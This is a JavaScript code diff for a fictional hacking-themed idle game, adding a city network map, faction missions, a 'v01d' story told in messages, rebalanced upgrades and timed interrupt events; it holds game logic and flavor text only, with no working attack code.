+    {id:'ghost_corp',     name:'CORP ESPIONAGE',      type:'exfil', typeTag:'EXFIL',
+     hPC:.040,hOC:12, reward:{base:950},unlockAt:[25,5000],
+     driver:'bandwidth', pBase:22,
+     flavor:['Accessing internal Confluence...','Copying Q3 strategic plans...','Board meeting recordings...','R&D roadmap acquired...','Cleaning access logs...','Package delivered to client.'],
+    },
+  ],
+};
+
 let MISSIONS=MT.map(t=>genMission(t));
+let FACTION_MISSIONS=[];
 
-// ══════════════════════════════════════════════════════
-// UPGRADES
-// ══════════════════════════════════════════════════════
-const UPG=[
-  {id:'bw1',sec:'BANDWIDTH',name:'DSL Connection',   desc:'56k → 1Mb/s.',          mx:1,cost:()=>400,   apply:()=>{G.bandwidth=1000;},   cond:()=>true},
-  {id:'bw2',sec:'BANDWIDTH',name:'Cable Modem',      desc:'1Mb → 10Mb/s.',         mx:1,cost:()=>2000,  apply:()=>{G.bandwidth=10000;},  cond:()=>(G.upgrades.bw1||0)>=1},
-  {id:'bw3',sec:'BANDWIDTH',name:'Fiber Optic',      desc:'10Mb → 100Mb/s.',       mx:1,cost:()=>10000, apply:()=>{G.bandwidth=100000;}, cond:()=>(G.upgrades.bw2||0)>=1},
-  {id:'bw4',sec:'BANDWIDTH',name:'Dark Fiber',       desc:'100Mb → 1Gb/s.',        mx:1,cost:()=>50000, apply:()=>{G.bandwidth=1000000;},cond:()=>(G.upgrades.bw3||0)>=1},
-  {id:'cpu1',sec:'CPU',name:'Dual-Core',             desc:'256MHz → 1GHz. Crack 4×.',mx:1,cost:()=>600,  apply:()=>{G.cpu=1000;},   cond:()=>true},
-  {id:'cpu2',sec:'CPU',name:'Quad-Core Rig',         desc:'1GHz → 2.4GHz.',        mx:1,cost:()=>3500,  apply:()=>{G.cpu=2400;},   cond:()=>(G.upgrades.cpu1||0)>=1},
-  {id:'cpu3',sec:'CPU',name:'GPU Cluster',           desc:'2.4GHz → 4GHz eq.',     mx:1,cost:()=>18000, apply:()=>{G.cpu=4000;},   cond:()=>(G.upgrades.cpu2||0)>=1},
-  {id:'cpu4',sec:'CPU',name:'ASIC Array',            desc:'4GHz → 16GHz.',         mx:1,cost:()=>90000, apply:()=>{G.cpu=16000;},  cond:()=>(G.upgrades.cpu3||0)>=1},
-  {id:'ram1',sec:'MEMORY',name:'4GB RAM',            desc:'Exploit speed ×2.',     mx:1,cost:()=>2200,  apply:()=>{G.ram=4096;},   cond:()=>(G.upgrades.cpu1||0)>=1},
-  {id:'ram2',sec:'MEMORY',name:'16GB RAM',           desc:'Exploit speed ×4.',     mx:1,cost:()=>14000, apply:()=>{G.ram=16384;},  cond:()=>(G.upgrades.ram1||0)>=1},
-  {id:'lat1',sec:'NETWORK',name:'VPN Tunnel',        desc:'200ms → 80ms. Trace -25%. Interrupts -20%.',mx:1,cost:()=>800,  apply:()=>{G.latency=80;}, cond:()=>true},
-  {id:'lat2',sec:'NETWORK',name:'Tor Routing',       desc:'80ms → 30ms. Trace -50%. Interrupts -40%.',mx:1,cost:()=>4500, apply:()=>{G.latency=30;}, cond:()=>(G.upgrades.lat1||0)>=1},
-  {id:'lat3',sec:'NETWORK',name:'Dark Proxy',        desc:'30ms → 5ms. Trace -75%. Interrupts -70%.',mx:1,cost:()=>22000,apply:()=>{G.latency=5;},  cond:()=>(G.upgrades.lat2||0)>=1},
-  {id:'type1',sec:'SCRIPTING',name:'Tab Complete',   desc:'Each tap = full word.',  mx:1,cost:()=>250,   apply:()=>{G.typingTier=1;}, cond:()=>true},
-  {id:'type2',sec:'SCRIPTING',name:'Macro Hotkeys',  desc:'One tap = full command.',mx:1,cost:()=>1200,  apply:()=>{G.typingTier=2;}, cond:()=>(G.upgrades.type1||0)>=1},
-  {id:'type3',sec:'SCRIPTING',name:'Cron Scheduler', desc:'Auto-executes. True idle.',mx:1,cost:()=>8000, apply:()=>{G.typingTier=3;startAutoTick();},cond:()=>(G.upgrades.type2||0)>=1},
-  {id:'q1',sec:'TASK QUEUE',name:'Scheduler v1',     desc:'Queue up to 2 missions.',mx:1,cost:()=>5000,  apply:()=>{G.maxQueueSize=2;},cond:()=>G.missionsCompleted>=15},
-  {id:'q2',sec:'TASK QUEUE',name:'Scheduler v2',     desc:'Queue up to 3 missions.',mx:1,cost:()=>22000, apply:()=>{G.maxQueueSize=3;},cond:()=>(G.upgrades.q1||0)>=1},
-  {id:'q3',sec:'TASK QUEUE',name:'Scheduler v3',     desc:'Queue up to 5 missions.',mx:1,cost:()=>80000, apply:()=>{G.maxQueueSize=5;},cond:()=>(G.upgrades.q2||0)>=1},
-  {id:'dec1',sec:'SECURITY',name:'Decoy Server',     desc:'Trace decays 2× faster idle.',mx:1,cost:()=>1500,apply:()=>{},cond:()=>(G.upgrades.lat1||0)>=1},
+// ═══════════════════════════════════════════════
+// NETWORK MAP NODES
+// ═══════════════════════════════════════════════
+// Nodes by sector. sector:0 = local (yours). sector:1+ = hostile territory.
+// Local nodes start unknown and are revealed by recon. No rivals in sector 0.
+const MAP_NODES=[
+  // SECTOR 0 — DOWNTOWN (city blocks, open networks, no rivals)
+  {id:'local_net',    name:'YOUR BLOCK',      sector:0, connects:['cafe_wifi','hotel_net','street_cam']},
+  {id:'cafe_wifi',    name:'CAFE GUEST WIFI', sector:0, connects:['hotel_net','bodega_pos']},
+  {id:'hotel_net',    name:'HOTEL LOBBY NET', sector:0, connects:['street_cam']},
+  {id:'bodega_pos',   name:'BODEGA POS SYS',  sector:0, connects:[]},
+  {id:'street_cam',   name:'STREET CAM NODE', sector:0, connects:['isp_relay']},
+  {id:'isp_relay',    name:'ISP RELAY NODE',  sector:0, connects:[]},
+  // SECTOR 1 — FINANCIAL DISTRICT (corps, rivals present)
+  {id:'fin_entry',    name:'FINANCE ENTRY',   sector:1, connects:['corp_db','corp_mail']},
+  {id:'corp_db',      name:'CORP DATABASE',   sector:1, connects:[]},
+  {id:'corp_mail',    name:'CORP MAIL SRV',   sector:1, connects:[]},
+  // SECTOR 2 — GOV QUARTER
+  {id:'gov_subnet',   name:'CITY HALL NET',   sector:2, connects:['police_net','transit_db']},
+  {id:'police_net',   name:'POLICE DISPATCH', sector:2, connects:[]},
+  {id:'transit_db',   name:'TRANSIT AUTH DB', sector:2, connects:[]},
+  // SECTOR 3 — UNDERTOWN
+  {id:'darknet',      name:'UNDERTOWN RELAY', sector:3, connects:['market','cipher_node']},
+  {id:'market',       name:'DARK MARKET SRV', sector:3, connects:[]},
+  {id:'cipher_node',  name:'ANON RELAY NODE', sector:3, connects:[]},
 ];
 
-// ══════════════════════════════════════════════════════
-// NARRATIVE BEATS
-// ══════════════════════════════════════════════════════
-const STORY=[
-  {at:1,  msg:"Your first successful breach. Somewhere, a log file just got a new entry."},
-  {at:5,  msg:"Five operations. You're getting faster. The networks are getting slower."},
-  {at:8,  msg:"Unknown handle 'v01d' messages you: 'nice work on the scan. we're watching.'"},
-  {at:15, msg:"DARKWEB MARKET: Your first data dump is live. Buyer confirmed. $0.12/record."},
-  {at:20, msg:"Your alias shows up in a security researcher's blog post. They spell it wrong."},
-  {at:30, msg:"v01d again: 'you should be more careful. they're not just watching the networks.'"},
-  {at:40, msg:"BREAKING: FBI announces Operation GHOSTNET. Task force targeting unknown hacker."},
-  {at:50, msg:"v01d: 'I know who you are. I'm not them. But they're close. Burn soon.'"},
-  {at:65, msg:"Your botnet has 47 nodes. It whispers to you now. Always running. Always watching."},
-];
-let shownStory=new Set();
-
-function checkStory(){
-  STORY.forEach(s=>{
-    if(!shownStory.has(s.at)&&G.missionsCompleted>=s.at){
-      shownStory.add(s.at);
-      setTimeout(()=>{
-        logSep();
-        log(`// ${s.msg}`,'story');
-        logSep();
-      },800);
+function initNetworkMap(){
+  MAP_NODES.forEach(n=>{
+    if(!G.networkNodes[n.id]){
+      // Only local_net starts visible — everything else is unknown
+      const startStatus = n.id==='local_net' ? 'scanned' : 'unknown';
+      G.networkNodes[n.id]={status:startStatus, name:n.name, sector:n.sector};
     }
   });
 }
 
-// ══════════════════════════════════════════════════════
-// INTERRUPT SYSTEM
-// ══════════════════════════════════════════════════════
-const INTERRUPTS=[
-  {
-    id:'interpol_scan',
-    title:'⚠ INTERPOL SCAN DETECTED',
-    body:'Anomalous traffic flagged on your subnet. A scan is sweeping toward your node in {timer}s.',
-    type:'timed_tap', // single tap button, countdown
-    timer:12,
-    tapLabel:'[ SPOOF MAC ADDRESS ]',
-    successMsg:'MAC spoofed. Scan missed you.',
-    failMsg:'Scan hit your node. Heat spike.',
-    heatOnFail:25,
-    condition:()=>G.heat>30,
-  },
-  {
-    id:'honeypot',
-    title:'⚠ HONEYPOT DETECTED',
-    body:'The target is responding suspiciously. This may be a trap. What do you do?',
-    type:'choice',
-    choices:[
-      {label:'[ ABORT — Pull out now ]',     cls:'safe',  outcome:'abort',   msg:'Safely disconnected. Mission lost.'},
-      {label:'[ PUSH — Stay and finish ]',   cls:'risky', outcome:'continue',msg:'Pushed through. Trace elevated.'},
-      {label:'[ SPOOF — Fake your origin ]', cls:'',      outcome:'spoof',   msg:'Spoofed. Continuing with penalty.'},
-    ],
-    condition:()=>G.missionsCompleted>=5,
-  },
-  {
-    id:'isp_flag',
-    title:'⚠ ISP BANDWIDTH FLAG',
-    body:'Your upload pattern triggered an automated ISP alert. Throttle connection now or reroute?',
-    type:'choice',
-    choices:[
-      {label:'[ THROTTLE — Slow down ]',      cls:'safe',  outcome:'throttle', msg:'Throttled. Process slowed 2×.'},
-      {label:'[ REROUTE — New exit node ]',   cls:'risky', outcome:'reroute',  msg:'Rerouted. Small heat spike.'},
-    ],
-    condition:()=>G.phase==='process',
-  },
-  {
-    id:'rival',
-    title:'⚠ RIVAL HACKER DETECTED',
-    body:'Unknown actor is competing for this target. Tap fast to lock them out before they do.',
-    type:'race', // rapid tap, 5 taps in countdown
-    timer:10,
-    tapsNeeded:6,
-    tapLabel:'[ LOCK THEM OUT ]',
-    successMsg:'Target secured. Rival blocked.',
-    failMsg:'Rival got partial access. Reward halved.',
-    condition:()=>G.missionsCompleted>=10,
-  },
-  {
-    id:'auth_expired',
-    title:'⚠ SESSION TOKEN EXPIRED',
-    body:'Authentication dropped. Tap to re-authenticate before the window closes.',
-    type:'timed_tap',
-    timer:8,
-    tapLabel:'[ RE-AUTHENTICATE ]',
-    successMsg:'Re-authenticated. Continuing.',
-    failMsg:'Session lost. Mission aborted.',
-    heatOnFail:15,
-    condition:()=>true,
-  },
-];
-
-let intState={active:false,tapsGiven:0,timerLeft:0,intObj:null,rewardHalved:false,processPaused:false};
-
-function getInterruptChance(){
-  // Base 15%, scales with heat, reduced by latency upgrades
-  let base=0.15+(G.heat/100)*0.25;
-  if((G.upgrades.lat1||0)>=1)base*=0.8;
-  if((G.upgrades.lat2||0)>=1)base*=0.6;
-  if((G.upgrades.lat3||0)>=1)base*=0.3;
-  return Math.min(base,0.55);
+function revealMapNode(nodeId){
+  if(G.networkNodes[nodeId]&&G.networkNodes[nodeId].status==='unknown'){
+    G.networkNodes[nodeId].status='scanned';
+    const node=MAP_NODES.find(n=>n.id===nodeId);
+    log(`> MAP UPDATE: ${node?.name||nodeId} discovered`,'info');
+  }
 }
 
-function tryFireInterrupt(){
+// Recon reveals nodes based on current sector
+function onReconComplete(){
+  const sector=G.currentSector;
+
+  if(sector===0){
+    // Reveal one unknown local node
+    const unknownLocal=MAP_NODES.filter(n=>n.sector===0&&G.networkNodes[n.id]?.status==='unknown');
+    if(unknownLocal.length>0){
+      const target=unknownLocal[rnd(0,unknownLocal.length-1)];
+      revealMapNode(target.id);
+    } else {
+      // All local nodes revealed — generate a random new node (fluff host)
+      addRandomLocalNode();
+    }
+  } else {
+    // Reveal one unknown node in current sector
+    const unknownSector=MAP_NODES.filter(n=>n.sector===sector&&G.networkNodes[n.id]?.status==='unknown');
+    if(unknownSector.length>0){
+      const target=unknownSector[rnd(0,unknownSector.length-1)];
+      revealMapNode(target.id);
+      // Seeding rivals when we first see nodes in hostile sectors
+      setTimeout(()=>initRivalNodes(),500);
+    } else {
+      // All sector nodes revealed — generate a random host in this sector
+      addRandomLocalNode(sector);
+    }
+  }
+}
+
+// Generate a procedural random node (extra targets for recon flavor)
+function addRandomLocalNode(sector=0){
+  const ip=randIP();
+  const names={
+    0:['NAIL_SALON_POS','GYM_GUEST_WIFI','BAR_SECURITY_NAS','PAWN_SHOP_SRV',
+       'PIZZA_POS_UNIT','LAUNDRY_CTRL','PARKING_METER_NET','BODEGA_CAM',
+       'APT_ROUTER_12B','SMART_METER_9C','THAI_REST_POS','BARBERSHOP_NAS'],
+    1:['OFFICE_PARK_RELAY','TRADING_FLOOR_NAS','BROKERAGE_PROXY','HR_ARCHIVE',
+       'CORP_LOBBY_WIFI','PAYROLL_SERVER','DATACENTER_NODE_C'],
+    2:['CITY_CAM_CLUSTER','PERMITS_OFFICE_NAS','ELECTION_ARCHIVE',
+       'DOT_SIGNAL_CTRL','COUNTY_RECORDS_DB'],
+    3:['CRYPTO_TUMBLER_4','FORUM_DARK_NODE','CARDER_MARKET_RELAY','EXPLOIT_BROKER'],
+  };
+  const pool=names[sector]||names[0];
+  const name2=pool[rnd(0,pool.length-1)];
+  const newId='rand_'+randHash().slice(0,6);
+  G.networkNodes[newId]={status:'scanned',name:name2,sector,ip,random:true};
+  // Add to MAP_NODES dynamically so the map renders it
+  if(!MAP_NODES.find(n=>n.id===newId)){
+    MAP_NODES.push({id:newId,name:name2,sector,connects:[]});
+  }
+  log(`> RECON: New host discovered — ${name2} (${ip})`,'info');
+}
+
+// ═══════════════════════════════════════════════
+// UPGRADES  (rebalanced costs)
+// ═══════════════════════════════════════════════
+const UPG=[
+  {id:'bw1',sec:'BANDWIDTH',name:'DSL Connection',   desc:'56k → 1Mb/s. Exfil faster.',    mx:1,cost:()=>300,   apply:()=>{G.bandwidth=1000;},   cond:()=>true},
+  {id:'bw2',sec:'BANDWIDTH',name:'Cable Modem',      desc:'1Mb → 10Mb/s.',                 mx:1,cost:()=>1800,  apply:()=>{G.bandwidth=10000;},  cond:()=>(G.upgrades.bw1||0)>=1},
+  {id:'bw3',sec:'BANDWIDTH',name:'Fiber Optic',      desc:'10Mb → 100Mb/s.',               mx:1,cost:()=>9000,  apply:()=>{G.bandwidth=100000;}, cond:()=>(G.upgrades.bw2||0)>=1},
+  {id:'bw4',sec:'BANDWIDTH',name:'Dark Fiber',       desc:'100Mb → 1Gb/s.',                mx:1,cost:()=>45000, apply:()=>{G.bandwidth=1000000;},cond:()=>(G.upgrades.bw3||0)>=1},
+  {id:'cpu1',sec:'CPU',name:'Dual-Core',             desc:'256MHz → 1GHz. Crack 4× faster.',mx:1,cost:()=>500,  apply:()=>{G.cpu=1000;},   cond:()=>true},
+  {id:'cpu2',sec:'CPU',name:'Quad-Core Rig',         desc:'1GHz → 2.4GHz.',                mx:1,cost:()=>2800,  apply:()=>{G.cpu=2400;},   cond:()=>(G.upgrades.cpu1||0)>=1},
+  {id:'cpu3',sec:'CPU',name:'GPU Cluster',           desc:'2.4GHz → 4GHz.',                mx:1,cost:()=>16000, apply:()=>{G.cpu=4000;},   cond:()=>(G.upgrades.cpu2||0)>=1},
+  {id:'cpu4',sec:'CPU',name:'ASIC Array',            desc:'4GHz → 16GHz. Near-instant.',   mx:1,cost:()=>85000, apply:()=>{G.cpu=16000;},  cond:()=>(G.upgrades.cpu3||0)>=1},
+  {id:'ram1',sec:'MEMORY',name:'4GB RAM',            desc:'Exploit speed ×2.',             mx:1,cost:()=>2000,  apply:()=>{G.ram=4096;},   cond:()=>(G.upgrades.cpu1||0)>=1},
+  {id:'ram2',sec:'MEMORY',name:'16GB RAM',           desc:'Exploit speed ×4.',             mx:1,cost:()=>12000, apply:()=>{G.ram=16384;},  cond:()=>(G.upgrades.ram1||0)>=1},
+  {id:'lat1',sec:'NETWORK',name:'VPN Tunnel',        desc:'200ms → 80ms. Trace -25%. Interrupts -20%.',mx:1,cost:()=>700, apply:()=>{G.latency=80;},cond:()=>true},
+  {id:'lat2',sec:'NETWORK',name:'Tor Routing',       desc:'80ms → 30ms. Trace -50%. Interrupts -40%.',mx:1,cost:()=>4000,apply:()=>{G.latency=30;},cond:()=>(G.upgrades.lat1||0)>=1},
+  {id:'lat3',sec:'NETWORK',name:'Dark Proxy',        desc:'30ms → 5ms. Trace -75%. Interrupts -70%.',mx:1,cost:()=>20000,apply:()=>{G.latency=5;},cond:()=>(G.upgrades.lat2||0)>=1},
+  {id:'type1',sec:'SCRIPTING',name:'Tab Complete',   desc:'Each tap = full word.',          mx:1,cost:()=>200,   apply:()=>{G.typingTier=1;},cond:()=>true},
+  {id:'type2',sec:'SCRIPTING',name:'Macro Hotkeys',  desc:'One tap = full command.',       mx:1,cost:()=>1000,  apply:()=>{G.typingTier=2;},cond:()=>(G.upgrades.type1||0)>=1},
+  {id:'type3',sec:'SCRIPTING',name:'Cron Scheduler', desc:'Auto-executes. True idle.',     mx:1,cost:()=>7000,  apply:()=>{G.typingTier=3;startAutoTick();},cond:()=>(G.upgrades.type2||0)>=1},
+  {id:'q1',sec:'TASK QUEUE',name:'Scheduler v1',     desc:'Queue 2 missions.',             mx:1,cost:()=>4500,  apply:()=>{G.maxQueueSize=2;},cond:()=>G.missionsCompleted>=15},
+  {id:'q2',sec:'TASK QUEUE',name:'Scheduler v2',     desc:'Queue 3 missions.',             mx:1,cost:()=>20000, apply:()=>{G.maxQueueSize=3;},cond:()=>(G.upgrades.q1||0)>=1},
+  {id:'q3',sec:'TASK QUEUE',name:'Scheduler v3',     desc:'Queue 5 missions.',             mx:1,cost:()=>75000, apply:()=>{G.maxQueueSize=5;},cond:()=>(G.upgrades.q2||0)>=1},
+  {id:'dec1',sec:'SECURITY',name:'Decoy Server',     desc:'Trace decays 2× faster idle.', mx:1,cost:()=>1400,  apply:()=>{},cond:()=>(G.upgrades.lat1||0)>=1},
+];
+
+// ═══════════════════════════════════════════════
+// NARRATIVE — v0id STORYLINE
+// ═══════════════════════════════════════════════
+const VOID_MSGS=[
+  {at:1,  msg:"First breach logged. You are not as invisible as you think.",cls:'void'},
+  {at:4,  msg:"v01d: I have been watching you. Sloppy on the recon. Slow on the exfil. But you have instincts.",cls:'void'},
+  {at:8,  msg:"v01d: Two factions are recruiting. CIPHER wants chaos. GHOSTNET wants profit. Choose carefully.",cls:'void'},
+  {at:10, msg:"v01d: The feds know someone is hitting these nodes. They do not know who yet. Keep it that way.",cls:'void'},
+  {at:15, msg:"DARKWEB MARKETS: Your data is moving. Check the MARKET tab. Someone out there is buying.",cls:'story'},
+  {at:20, msg:"v01d: You picked a side. Good. The other faction noticed. They will make things harder for you.",cls:'void'},
+  {at:25, msg:"BREAKING — AXIOM CORP reports sophisticated breach to SEC. Internal memo cites ghost_r00t signature.",cls:'warn'},
+  {at:30, msg:"v01d: I used to work for them. The feds, I mean. I left when I found out what they were really scanning for.",cls:'void'},
+  {at:35, msg:"Operation GHOSTNET: FBI task force activated. 12 agents. They have a partial alias. They have your ISP.",cls:'err'},
+  {at:40, msg:"v01d: I can make you disappear. Costs everything you have built. Or you stay and hit the one target that matters.",cls:'void'},
+  {at:50, msg:"v01d: AXIOM CORP NODE 7. Federal Reserve contract server. Hit it and every agency in 5 countries knows your alias.",cls:'void'},
+  {at:60, msg:"v01d: You are close. The botnet is ready. One command and AXIOM goes dark for 72 hours. Is that the move?",cls:'void'},
+  {at:65, msg:"FEDERAL ALERT: Warrant issued for unknown actor operating under alias ghost_r00t. Asset freeze initiated.",cls:'err'},
+  {at:75, msg:"v01d: You actually did it. I did not think you would. They are coming for you. Burn now. Become someone else.",cls:'void'},
+  {at:80, msg:"v01d: This is where it ends or begins. Your call. I will be watching either way. I always am.",cls:'void'},
+];
+let shownMsgs=new Set();
+
+function checkNarrative(){
+  VOID_MSGS.forEach(m=>{
+    if(!shownMsgs.has(m.at)&&G.missionsCompleted>=m.at){
+      shownMsgs.add(m.at);
+      setTimeout(()=>{
+        logSep('msg'); logMsg(m.msg,m.cls||'story'); logSep('msg');
+        // Also echo a short teaser to main terminal
+        log('> [MSG] New message received. Check MSG tab.','info');
+        if(m.at===8&&!G.factionOffered){G.factionOffered=true;setTimeout(offerFaction,2000);}
+      },1000);
+    }
+  });
+}
+
+function offerFaction(){
+  if(G.faction)return;
+  logSep();
+  log('> INCOMING: Two faction invites waiting. Tap [OPS] to choose.','info');
+  logSep();
+  // Auto-open OPS panel to faction choice — force fresh open
+  curPanel='none';
+  setTimeout(()=>showPanel('missions'), 300);
+}
+
+function chooseFaction(f){
+  G.faction=f;
+  FACTION_MISSIONS=FACTION_MT[f]?.map(t=>genMission(t))||[];
+  const fb=document.getElementById('faction-bar');
+  fb.classList.add('on');
+  document.getElementById('faction-cipher').style.display=f==='cipher'?'block':'none';
+  document.getElementById('faction-ghost').style.display=f==='ghost'?'block':'none';
+  log(`> FACTION ALIGNMENT: ${f==='cipher'?'CIPHER COLLECTIVE':'GHOSTNET'}. Bonus missions unlocked.`,'ok');
+  logSep();
+  showPanel('none');
+}
+
+// ═══════════════════════════════════════════════
+// INTERRUPTS
+// ═══════════════════════════════════════════════
+const INTERRUPTS=[
+  {id:'interpol',title:'⚠ INTERPOL SCAN',body:'Subnet sweep inbound. Spoof your MAC before the scan hits.',type:'timed_tap',timer:12,tapLabel:'[ SPOOF MAC ADDRESS ]',successMsg:'MAC spoofed. Scan missed.',failMsg:'Scan logged your node. Heat spike.',heatOnFail:28,cond:()=>G.heat>25},
+  {id:'honeypot',title:'⚠ HONEYPOT DETECTED',body:'Target is responding suspiciously. May be a trap.',type:'choice',choices:[{label:'[ ABORT — pull out now ]',cls:'safe',outcome:'abort',msg:'Safe disconnect.'},{label:'[ PUSH — stay and finish ]',cls:'risky',outcome:'continue',msg:'Pushing through. Heat elevated.'},{label:'[ SPOOF — fake origin ]',cls:'',outcome:'spoof',msg:'Spoofed. Reward cut.'}],cond:()=>G.missionsCompleted>=5},
+  {id:'isp',title:'⚠ ISP TRAFFIC FLAG',body:'Upload pattern flagged by automated ISP system.',type:'choice',choices:[{label:'[ THROTTLE — slow down ]',cls:'safe',outcome:'throttle',msg:'Throttled. Process slowed.'},{label:'[ REROUTE — new exit node ]',cls:'risky',outcome:'reroute',msg:'Rerouted. Small heat spike.'}],cond:()=>G.phase==='process'},
+  {id:'rival',title:'⚠ RIVAL HACKER',body:'Unknown actor competing for this target. Lock them out.',type:'race',timer:10,tapsNeeded:6,tapLabel:'[ LOCK THEM OUT ]',successMsg:'Target secured.',failMsg:'Rival got partial access. Reward halved.',cond:()=>G.missionsCompleted>=10},
+  {id:'auth',title:'⚠ SESSION EXPIRED',body:'Authentication dropped. Re-authenticate before window closes.',type:'timed_tap',timer:8,tapLabel:'[ RE-AUTHENTICATE ]',successMsg:'Re-authenticated.',failMsg:'Session lost. Mission aborted.',heatOnFail:15,cond:()=>true},
+];
+
+function getIntChance(){
+  let b=0.12+(G.heat/100)*0.28;
+  if((G.upgrades.lat1||0)>=1)b*=.8;if((G.upgrades.lat2||0)>=1)b*=.6;if((G.upgrades.lat3||0)>=1)b*=.3;
+  return Math.min(b,.55);
+}
+
+function tryInterrupt(){
   if(intState.active||G.phase!=='process')return;
-  if(Math.random()>getInterruptChance())return;
-  const valid=INTERRUPTS.filter(i=>i.condition());
+  if(Math.random()>getIntChance())return;
+  const valid=INTERRUPTS.filter(i=>i.cond());
   if(!valid.length)return;
-  const int=valid[rnd(0,valid.length-1)];
-  fireInterrupt(int);
+  fireInterrupt(valid[rnd(0,valid.length-1)]);
 }
 
 function fireInterrupt(int){
   intState={active:true,tapsGiven:0,timerLeft:int.timer||10,intObj:int,rewardHalved:false,processPaused:true};
-  clearInterval(procInt); // pause processing
-  log(`> ⚠ INTERRUPT: ${int.title}`,'err');
-
-  const ov=document.getElementById('interrupt-overlay');
+  clearInterval(procInt);
+  log(`> ⚠ INTERRUPT: ${int.title}`,'err'); playAlert();
   document.getElementById('int-title').textContent=int.title;
   document.getElementById('int-body').textContent=(int.body||'').replace('{timer}',int.timer||10);
   document.getElementById('int-timer').textContent='';
   document.getElementById('int-actions').innerHTML='';
-  ov.classList.add('on');
-
+  document.getElementById('int-ov').classList.add('on');
   if(int.type==='timed_tap'){
     intState.timerLeft=int.timer;
     document.getElementById('int-timer').textContent=intState.timerLeft+'s';
-    const btn=document.createElement('button');
-    btn.className='int-btn'; btn.textContent=int.tapLabel;
-    btn.onclick=()=>resolveInterrupt('tap_success');
-    document.getElementById('int-actions').appendChild(btn);
-    intTimerInt=setInterval(()=>{
-      intState.timerLeft--;
-      document.getElementById('int-timer').textContent=intState.timerLeft+'s';
-      if(intState.timerLeft<=0){clearInterval(intTimerInt);resolveInterrupt('tap_fail');}
-    },1000);
-  } else if(int.type==='choice'){
-    (int.choices||[]).forEach(c=>{
-      const btn=document.createElement('button');
-      btn.className=`int-btn ${c.cls||''}`;
-      btn.textContent=c.label;
-      btn.onclick=()=>resolveInterrupt(c.outcome,c);
-      document.getElementById('int-actions').appendChild(btn);
-    });
-  } else if(int.type==='race'){
+    const btn=document.createElement('button');btn.className='ibtn';btn.textContent=int.tapLabel;
+    btn.onclick=()=>resolveInt('tap_ok');document.getElementById('int-actions').appendChild(btn);
+    intTimerInt=setInterval(()=>{intState.timerLeft--;document.getElementById('int-timer').textContent=intState.timerLeft+'s';if(intState.timerLeft<=0){clearInterval(intTimerInt);resolveInt('tap_fail');}},1000);
+  }else if(int.type==='choice'){
+    (int.choices||[]).forEach(c=>{const btn=document.createElement('button');btn.className=`ibtn ${c.cls||''}`;btn.textContent=c.label;btn.onclick=()=>resolveInt(c.outcome,c);document.getElementById('int-actions').appendChild(btn);});
+  }else if(int.type==='race'){
     intState.timerLeft=int.timer;
-    document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${int.tapsNeeded} taps needed`;
-    const btn=document.createElement('button');
-    btn.className='int-btn'; btn.textContent=int.tapLabel;
-    btn.onclick=()=>{
-      intState.tapsGiven++;
-      document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${Math.max(0,int.tapsNeeded-intState.tapsGiven)} more taps`;
-      if(intState.tapsGiven>=int.tapsNeeded){clearInterval(intTimerInt);resolveInterrupt('race_win');}
-    };
+    document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${int.tapsNeeded} taps`;
+    const btn=document.createElement('button');btn.className='ibtn';btn.textContent=int.tapLabel;
+    btn.onclick=()=>{intState.tapsGiven++;document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${Math.max(0,int.tapsNeeded-intState.tapsGiven)} more`;if(intState.tapsGiven>=int.tapsNeeded){clearInterval(intTimerInt);resolveInt('race_win');}};
     document.getElementById('int-actions').appendChild(btn);
-    intTimerInt=setInterval(()=>{
-      intState.timerLeft--;
-      document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${Math.max(0,int.tapsNeeded-intState.tapsGiven)} more taps`;
-      if(intState.timerLeft<=0){clearInterval(intTimerInt);resolveInterrupt('race_lose');}
-    },1000);
+    intTimerInt=setInterval(()=>{intState.timerLeft--;document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${Math.max(0,int.tapsNeeded-intState.tapsGiven)} more`;if(intState.timerLeft<=0){clearInterval(intTimerInt);resolveInt('race_lose');}},1000);
   }
 }
 
-function resolveInterrupt(outcome,choice){
+function resolveInt(outcome,choice){
   clearInterval(intTimerInt);
-  document.getElementById('interrupt-overlay').classList.remove('on');
+  document.getElementById('int-ov').classList.remove('on');
   intState.active=false;
-
   const int=intState.intObj;
   G.interruptFails=G.interruptFails||0;
-
-  // Outcome logic
-  let msg='',resumeProcess=true;
-  if(outcome==='tap_success'){
-    msg=int.successMsg; log(`> ✓ EVADED: ${msg}`,'ok');
-  } else if(outcome==='tap_fail'){
-    G.interruptFails++;
-    msg=int.failMsg; log(`> ✗ FAILED: ${msg}`,'warn');
-    // Escalating consequences
-    if(G.interruptFails===1){
-      addHeat(int.heatOnFail||20);
-      const fine=Math.floor(G.credits*0.05);
-      G.credits=Math.max(0,G.credits-fine);
-      if(fine>0)log(`> FINE: -$${fmtNum(fine)} (5% credit penalty)`,'warn');
-    } else if(G.interruptFails===2){
-      addHeat(int.heatOnFail||20);
-      log(`> LOCKOUT: 30s trace decay suspended`,'err');
-      // suspend heat decay for 30s
-      setTimeout(()=>log('> Lockout lifted.','dim'),30000);
-    } else {
-      log(`> REWARD CUT 50% for this mission`,'err');
-      intState.rewardHalved=true;
-    }
-    if(int.id==='auth_expired'){resumeProcess=false;abortMission();}
-  } else if(outcome==='abort'){
-    log(`> ${choice.msg}`,'warn'); resumeProcess=false; abortMission();
-  } else if(outcome==='continue'){
-    log(`> ${choice.msg}`,'warn'); addHeat(15);
-  } else if(outcome==='spoof'){
-    log(`> ${choice.msg}`,'dim'); addHeat(5);
-    intState.rewardHalved=true;
-  } else if(outcome==='throttle'){
-    log(`> ${choice.msg}`,'dim');
-    // slow process — handled by resuming with longer tick
-  } else if(outcome==='reroute'){
-    log(`> ${choice.msg}`,'warn'); addHeat(8);
-  } else if(outcome==='race_win'){
-    log(`> ✓ Target locked. Rival blocked.`,'ok');
-  } else if(outcome==='race_lose'){
-    G.interruptFails++;
-    log(`> Rival got partial access. Reward halved.`,'warn');
-    intState.rewardHalved=true;
-  }
-
+  let resume=true;
+  if(outcome==='tap_ok'){log(`> ✓ EVADED: ${int.successMsg}`,'ok');}
+  else if(outcome==='tap_fail'){
+    G.interruptFails++;log(`> ✗ FAILED: ${int.failMsg}`,'warn');
+    if(G.interruptFails===1){addHeat(int.heatOnFail||20);const fine=Math.floor(G.credits*0.05);G.credits=Math.max(0,G.credits-fine);if(fine>0)log(`> FINE: -$${fmtNum(fine)}`,'warn');}
